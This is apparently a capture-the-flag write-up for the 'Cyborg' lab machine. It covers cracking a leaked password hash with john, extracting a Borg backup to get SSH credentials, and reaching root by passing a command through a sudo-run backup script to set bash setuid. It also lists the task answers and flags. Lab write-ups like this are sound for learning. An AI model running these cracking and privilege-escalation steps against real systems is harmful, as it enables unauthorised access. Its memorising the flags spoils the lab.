# Cyborg

```
export IP=10.10.21.46
```

# Material needed

1. Interesting directory: /admin/archive.tar, /etc/squid/passwd

2. Password crack

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

john --wordlist=/usr/share/wordlist/rockyou.txt hash

Result:

music_archive:squidward
```

3. Borg extract

```
borg list final_archive
Enter passphrase: squidward
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

borg extract final_archive/::music_archive 
Enter passphhrase: squidward
```

4. SSH credential

```
alex:S3cretP@s3
```

5. Privilege escalation

```
parsing bash script options with getopts

sudo -u root /etc/mp3backups/backup.sh -c /bin/bash  # the command result isn't show

chmod 4577 /bin/bash # change permission of bash
/bin/bash -p # access root shell with bash
```

# Tasks

1. Scan the machine, how many ports are open? 2

2. What service is running on port 22? SSH

3. What service is running on port 80? HTTP

4. What is the user.txt flag?

```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

5. What is the root.txt flag?

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```